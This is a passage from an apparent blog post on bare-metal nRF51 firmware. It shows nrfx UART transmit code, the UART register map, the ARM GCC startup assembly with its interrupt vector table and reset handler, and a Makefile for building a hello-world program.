nrf_uart_event_clear(p_instance-&gt;p_reg, NRF_UART_EVENT_TXDRDY);\n    nrf_uart_task_trigger(p_instance-&gt;p_reg, NRF_UART_TASK_STARTTX);\n\n    tx_byte(p_instance-&gt;p_reg, p_cb);\n\n    if (p_cb-&gt;handler == NULL)\n    {\n        if (!tx_blocking(p_instance-&gt;p_reg, p_cb))\n        {\n            // The transfer has been aborted.\n            err_code = NRFX_ERROR_FORBIDDEN;\n        }\n        else\n        {\n            // Wait until the last byte is completely transmitted.\n            while (!nrf_uart_event_check(p_instance-&gt;p_reg, NRF_UART_EVENT_TXDRDY))\n            {}\n            nrf_uart_task_trigger(p_instance-&gt;p_reg, NRF_UART_TASK_STOPTX);\n        }\n        p_cb-&gt;tx_buffer_length = 0;\n    }\n\n    NRFX_LOG_INFO(\"Function: %s, error code: %s.\", __func__, NRFX_LOG_ERROR_STRING_GET(err_code));\n    return err_code;\n}\nit calls tx_byte(),\nnrf_uart_txd_set()...\nstatic void tx_byte(NRF_UART_Type * p_uart, uart_control_block_t * p_cb)\n{\n    nrf_uart_event_clear(p_uart, NRF_UART_EVENT_TXDRDY);\n    uint8_t txd = p_cb-&gt;p_tx_buffer[p_cb-&gt;tx_counter];\n    p_cb-&gt;tx_counter++;\n    nrf_uart_txd_set(p_uart, txd);\n}\n\nNRF_STATIC_INLINE void nrf_uart_txd_set(NRF_UART_Type * p_reg, uint8_t txd)\n{\n    p_reg-&gt;TXD = txd;\n}\nBase and registers addresses were defined in nrf51.h.\ntypedef struct {                                /*!&lt; (@ 0x40002000) UART0 Structure                                            */\n  __OM  uint32_t  TASKS_STARTRX;                /*!&lt; (@ 0x00000000) Start UART receiver.                                       */\n  __OM  uint32_t  TASKS_STOPRX;                 /*!&lt; (@ 0x00000004) Stop UART receiver.                                        */\n  __OM  uint32_t  TASKS_STARTTX;                /*!&lt; (@ 0x00000008) Start UART transmitter.                                    */\n  __OM  uint32_t  TASKS_STOPTX;                 /*!&lt; (@ 0x0000000C) Stop UART transmitter.                                     */\n  __IM  uint32_t  RESERVED[3];\n  __OM  uint32_t  TASKS_SUSPEND;                /*!&lt; (@ 0x0000001C) Suspend UART.                                              */\n  __IM  uint32_t  RESERVED1[56];\n  __IOM uint32_t  EVENTS_CTS;                   /*!&lt; (@ 0x00000100) CTS activated.                                             */\n  __IOM uint32_t  EVENTS_NCTS;                  /*!&lt; (@ 0x00000104) CTS deactivated.                                           */\n  __IOM uint32_t  EVENTS_RXDRDY;                /*!&lt; (@ 0x00000108) Data received in RXD.                                      */\n  __IM  uint32_t  RESERVED2[4];\n  __IOM uint32_t  EVENTS_TXDRDY;                /*!&lt; (@ 0x0000011C) Data sent from TXD.                                        */\n  __IM  uint32_t  RESERVED3;\n  __IOM uint32_t  EVENTS_ERROR;                 /*!&lt; (@ 0x00000124) Error detected.                                            */\n  __IM  uint32_t  RESERVED4[7];\n  __IOM uint32_t  EVENTS_RXTO;                  /*!&lt; (@ 0x00000144) Receiver timeout.                                          */\n  __IM  uint32_t  RESERVED5[46];\n  __IOM uint32_t  SHORTS;                       /*!&lt; (@ 0x00000200) Shortcuts for UART.                                        */\n  __IM  uint32_t  RESERVED6[64];\n  __IOM uint32_t  INTENSET;                     /*!&lt; (@ 0x00000304) Interrupt enable set register.                             */\n  __IOM uint32_t  INTENCLR;                     /*!&lt; (@ 0x00000308) Interrupt enable clear register.                           */\n  __IM  uint32_t  RESERVED7[93];\n  __IOM uint32_t  ERRORSRC;                     /*!&lt; (@ 0x00000480) Error source. Write error field to 1 to clear\n                                                                    error.                                                     */\n  __IM  uint32_t  RESERVED8[31];\n  __IOM uint32_t  ENABLE;                       /*!&lt; (@ 0x00000500) Enable UART and acquire IOs.                               */\n  __IM  uint32_t  RESERVED9;\n  __IOM uint32_t  PSELRTS;                      /*!&lt; (@ 0x00000508) Pin select for RTS.                                        */\n  __IOM uint32_t  PSELTXD;                      /*!&lt; (@ 0x0000050C) Pin select for TXD.                                        */\n  __IOM uint32_t  PSELCTS;                      /*!&lt; (@ 0x00000510) Pin select for CTS.                                        */\n  __IOM uint32_t  PSELRXD;                      /*!&lt; (@ 0x00000514) Pin select for RXD.                                        */\n  __IM  uint32_t  RXD;                          /*!&lt; (@ 0x00000518) RXD register. On read action the buffer pointer\n                                                                    is displaced. Once read the character is\n                                                                    consumed. If read when no character available,\n                                                                    the UART will stop working.                                */\n  __OM  uint32_t  TXD;                          /*!&lt; (@ 0x0000051C) TXD register.                                              */\n  __IM  uint32_t  RESERVED10;\n  __IOM uint32_t  BAUDRATE;                     /*!&lt; (@ 0x00000524) UART Baudrate.                                             */\n  __IM  uint32_t  RESERVED11[17];\n  __IOM uint32_t  CONFIG;                       /*!&lt; (@ 0x0000056C) Configuration of parity and hardware flow control\n                                                                    register.                                                  */\n  __IM  uint32_t  RESERVED12[675];\n  __IOM uint32_t  POWER;                        /*!&lt; (@ 0x00000FFC) Peripheral power control.                                  */\n} NRF_UART_Type;                                /*!&lt; Size = 4096 (0x1000)                                                      */\nRun a helloworld.c\nInitialize\nBefore executing the program, we need to initialize memory space\nsatisfying the ARMv6-M architecture.2\nIncludes:\nâ€‹ Stack Definition, Heap Definition, Interrupt Vector Table, Reset\nHandler, Entry point and prepare .data,\n.bss.\nFor GCC compiler, the library provides a startup.S.\n/*\n \nCopyright (c) 2009-2025 ARM Limited. All rights reserved.\n\n    SPDX-License-Identifier: Apache-2.0\n\nLicensed under the Apache License, Version 2.0 (the License); you may\nnot use this file except in compliance with the License.\nYou may obtain a copy of the License at\n\n    www.apache.org/licenses/LICENSE-2.0\n\nUnless required by applicable law or agreed to in writing, software\ndistributed under the License is distributed on an AS IS BASIS, WITHOUT\nWARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\nSee the License for the specific language governing permissions and\nlimitations under the License.\n\nNOTICE: This file has been modified by Nordic Semiconductor ASA.\n\n*/\n\n    .syntax unified\n    .arch armv6-m\n\n#ifdef __STARTUP_CONFIG\n#include \"startup_config.h\"\n#ifndef __STARTUP_CONFIG_STACK_ALIGNEMENT\n#define __STARTUP_CONFIG_STACK_ALIGNEMENT 3\n#endif\n#endif\n\n    .section .stack\n#if defined(__STARTUP_CONFIG)\n    .align __STARTUP_CONFIG_STACK_ALIGNEMENT\n    .equ    Stack_Size, __STARTUP_CONFIG_STACK_SIZE\n#elif defined(__STACK_SIZE)\n    .align 3\n    .equ    Stack_Size, __STACK_SIZE\n#else\n    .align 3\n    .equ    Stack_Size, 2048\n#endif\n    .globl __StackTop\n    .globl __StackLimit\n__StackLimit:\n    .space Stack_Size\n    .size __StackLimit, . - __StackLimit\n__StackTop:\n    .size __StackTop, . - __StackTop\n\n    .section .heap\n    .align 3\n#if defined(__STARTUP_CONFIG)\n    .equ Heap_Size, __STARTUP_CONFIG_HEAP_SIZE\n#elif defined(__HEAP_SIZE)\n    .equ Heap_Size, __HEAP_SIZE\n#else\n    .equ Heap_Size, 2048\n#endif\n    .globl __HeapBase\n    .globl __HeapLimit\n__HeapBase:\n    .if Heap_Size\n    .space Heap_Size\n    .endif\n    .size __HeapBase, . - __HeapBase\n__HeapLimit:\n    .size __HeapLimit, . - __HeapLimit\n\n    .section .isr_vector, \"ax\"\n    .align 2\n    .globl __isr_vector\n__isr_vector:\n    .long   __StackTop                  /* Top of Stack */\n    .long   Reset_Handler\n    .long   NMI_Handler\n    .long   HardFault_Handler\n    .long   0                           /*Reserved */\n    .long   0                           /*Reserved */\n    .long   0                           /*Reserved */\n    .long   0                           /*Reserved */\n    .long   0                           /*Reserved */\n    .long   0                           /*Reserved */\n    .long   0                           /*Reserved */\n    .long   SVC_Handler\n    .long   0                           /*Reserved */\n    .long   0                           /*Reserved */\n    .long   PendSV_Handler\n    .long   SysTick_Handler\n\n  /* External Interrupts */\n    .long   POWER_CLOCK_IRQHandler\n    .long   RADIO_IRQHandler\n    .long   UART0_IRQHandler\n    .long   SPI0_TWI0_IRQHandler\n    .long   SPI1_TWI1_IRQHandler\n    .long   0                           /*Reserved */\n    .long   GPIOTE_IRQHandler\n    .long   ADC_IRQHandler\n    .long   TIMER0_IRQHandler\n    .long   TIMER1_IRQHandler\n    .long   TIMER2_IRQHandler\n    .long   RTC0_IRQHandler\n    .long   TEMP_IRQHandler\n    .long   RNG_IRQHandler\n    .long   ECB_IRQHandler\n    .long   CCM_AAR_IRQHandler\n    .long   WDT_IRQHandler\n    .long   RTC1_IRQHandler\n    .long   QDEC_IRQHandler\n    .long   LPCOMP_IRQHandler\n    .long   SWI0_IRQHandler\n    .long   SWI1_IRQHandler\n    .long   SWI2_IRQHandler\n    .long   SWI3_IRQHandler\n    .long   SWI4_IRQHandler\n    .long   SWI5_IRQHandler\n    .long   0                           /*Reserved */\n    .long   0                           /*Reserved */\n    .long   0                           /*Reserved */\n    .long   0                           /*Reserved */\n    .long   0                           /*Reserved */\n    .long   0                           /*Reserved */\n\n    .size __isr_vector, . - __isr_vector\n\n/* Reset Handler */\n\n    .equ    NRF_POWER_RAMON_ADDRESS,             0x40000524\n    .equ    NRF_POWER_RAMONB_ADDRESS,            0x40000554\n    .equ    NRF_POWER_RAMONx_RAMxON_ONMODE_Msk,  0x3\n\n    .text\n    .thumb\n    .thumb_func\n    .align 1\n    .globl Reset_Handler\n    .type Reset_Handler, %function\nReset_Handler:\n\n    MOVS    R1, #NRF_POWER_RAMONx_RAMxON_ONMODE_Msk\n    \n    LDR     R0, =NRF_POWER_RAMON_ADDRESS\n    LDR     R2, [R0]\n    ORRS    R2, R1\n    STR     R2, [R0]\n\n    LDR     R0, =NRF_POWER_RAMONB_ADDRESS\n    LDR     R2, [R0]\n    ORRS    R2, R1\n    STR     R2, [R0]\n\n/* Loop to copy data from read only memory to RAM.\n * The ranges of copy from/to are specified by following symbols:\n *      __etext: LMA of start of the section to copy from. Usually end of text\n *      __data_start: VMA of start of the section to copy to.\n *      __data_end: VMA of end of the section to copy to. \n *\n * All addresses must be aligned to 4 bytes boundary.\n */\n#ifndef __STARTUP_SKIP_ETEXT\n\n/* Load .data */\n    ldr r1, =__data_start\n    ldr r2, =__data_end\n    ldr r3, =__data_load_start\n    bl copy_region\n\n/* Load .sdata */\n    ldr r1, =__sdata_start\n    ldr r2, =__sdata_end\n    ldr r3, =__sdata_load_start\n    bl copy_region\n\n/* Load .tdata */\n    ldr r1, =__tdata_start\n    ldr r2, =__tdata_end\n    ldr r3, =__tdata_load_start\n    bl copy_region\n\n/* Load .fast */\n    ldr r1, =__fast_start\n    ldr r2, =__fast_end\n    ldr r3, =__fast_load_start\n    bl copy_region\n\n    b copy_etext_done\n\n/* Method that loads data from nvm to ram */\ncopy_region:\n    subs r2, r2, r1\n    ble L_copy_region_done\n\nL_copy_region:\n    subs r2, r2, #4\n    ldr r0, [r3,r2]\n    str r0, [r1,r2]\n    bgt L_copy_region\n\nL_copy_region_done:\n\n    bx lr\n\ncopy_etext_done:\n\n\n#endif\n\n/* This part of work usually is done in C library startup code. Otherwise,\n * define __STARTUP_CLEAR_BSS to enable it in this startup. This section\n * clears the RAM where BSS data is located.\n *\n * The BSS section is specified by following symbols\n *    __bss_start__: start of the BSS section.\n *    __bss_end__: end of the BSS section.\n *\n * All addresses must be aligned to 4 bytes boundary.\n */\n#ifdef __STARTUP_CLEAR_BSS\n    ldr r1, =__bss_start__\n    ldr r2, =__bss_end__\n    bl clear_region\n\n    ldr r1, =__tbss_start__\n    ldr r2, =__tbss_end__\n    bl clear_region\n\n    ldr r1, =__sbss_start__\n    ldr r2, =__sbss_end__\n    bl clear_region\n\n    b clear_bss_done\n\n/* Method that clears default-0 registers */\nclear_region:\n    movs r0, 0\n\n    subs r2, r2, r1\n    ble .L_clear_region_done\n\n.L_clear_region:\n    subs r2, r2, #4\n    str r0, [r1, r2]\n    bgt .L_clear_region\n\n.L_clear_region_done:\n\n    bx lr\n\nclear_bss_done:\n\n#endif /* __STARTUP_CLEAR_BSS */\n\n/* Execute SystemInit function. */\n    bl SystemInit\n\n/* Call _start function provided by libraries.\n * If those libraries are not accessible, define __START as your entry point.\n */\n#ifndef __START\n#define __START _start\n#endif\n    bl __START\n\n    .pool\n    .size   Reset_Handler,.-Reset_Handler\n\n    .section \".text\"\n\n\n/* Dummy Exception Handlers (infinite loops which can be modified) */\n\n    .weak   NMI_Handler\n    .type   NMI_Handler, %function\nNMI_Handler:\n    b       .\n    .size   NMI_Handler, . - NMI_Handler\n\n\n    .weak   HardFault_Handler\n    .type   HardFault_Handler, %function\nHardFault_Handler:\n    b       .\n    .size   HardFault_Handler, . - HardFault_Handler\n\n\n    .weak   SVC_Handler\n    .type   SVC_Handler, %function\nSVC_Handler:\n    b       .\n    .size   SVC_Handler, . - SVC_Handler\n\n\n    .weak   PendSV_Handler\n    .type   PendSV_Handler, %function\nPendSV_Handler:\n    b       .\n    .size   PendSV_Handler, . - PendSV_Handler\n\n\n    .weak   SysTick_Handler\n    .type   SysTick_Handler, %function\nSysTick_Handler:\n    b       .\n    .size   SysTick_Handler, . - SysTick_Handler\n\n\n/* IRQ Handlers */\n\n    .globl  Default_Handler\n    .type   Default_Handler, %function\nDefault_Handler:\n    b       .\n    .size   Default_Handler, . - Default_Handler\n\n    .macro  IRQ handler\n    .weak   \\handler\n    .set    \\handler, Default_Handler\n    .endm\n\n    IRQ  POWER_CLOCK_IRQHandler\n    IRQ  RADIO_IRQHandler\n    IRQ  UART0_IRQHandler\n    IRQ  SPI0_TWI0_IRQHandler\n    IRQ  SPI1_TWI1_IRQHandler\n    IRQ  GPIOTE_IRQHandler\n    IRQ  ADC_IRQHandler\n    IRQ  TIMER0_IRQHandler\n    IRQ  TIMER1_IRQHandler\n    IRQ  TIMER2_IRQHandler\n    IRQ  RTC0_IRQHandler\n    IRQ  TEMP_IRQHandler\n    IRQ  RNG_IRQHandler\n    IRQ  ECB_IRQHandler\n    IRQ  CCM_AAR_IRQHandler\n    IRQ  WDT_IRQHandler\n    IRQ  RTC1_IRQHandler\n    IRQ  QDEC_IRQHandler\n    IRQ  LPCOMP_IRQHandler\n    IRQ  SWI0_IRQHandler\n    IRQ  SWI1_IRQHandler\n    IRQ  SWI2_IRQHandler\n    IRQ  SWI3_IRQHandler\n    IRQ  SWI4_IRQHandler\n    IRQ  SWI5_IRQHandler\n\n  .end\n\nAll the symbol above would be defined at a linker script(.ld).\nMakefile\nAfter everything prepared, use simply a makefile to complie.\nTARGET = main\n\nCC = arm-none-eabi-gcc\nOBJCOPY = arm-none-eabi-objcopy\n\nSRC = main.c \\\n      $(wildcard nrfx/drivers/src/*.c) \\\n      nrfx/mdk/gcc_startup_nrf51.S\n\nINCLUDES = -I. -Inrfx -Inrfx/mdk -Inrfx/hal -Inrfx/templates -Inrfx/drivers/include\n\nCFLAGS = -mcpu=cortex-m0 -mthumb -Wall -O0 -g -DNRF51 -DNRF51822_XXAA $(INCLUDES)\n\nLDFLAGS = -T nrf51822_xxaa.ld -nostartfiles\n\nOBJ := $(SRC:.c=.o)\nOBJ := $(OBJ:.S=.o)\n\nall: $(TARGET).elf\n\n%.o: %.c\n\t$(CC) $(CFLAGS) -c $&lt; -o $@\n\n%.o: %.S\n\t$(CC) $(CFLAGS) -c $&lt; -o $@\n\n$(TARGET).elf: $(OBJ)\n\t$(CC) $(CFLAGS) $(LDFLAGS) $^ -o $@\n\nbin: $(TARGET).elf\n\t$(OBJCOPY) -O binary $&lt; $(TARGET).bin\n\nclean:\n\trm -f $(OBJ) $(TARGET).elf $(TARGET).bin\nReferences\n\n\n\nNRF51_Series_Reference_Manual_v2.1.pdfâ†©ï¸\nArmv6-M\nArchitecture Reference Manualâ†©ï¸\n\n\n","categories":["Pwn","Study"],"tags":["QEMU","ARM","bare metal"]}]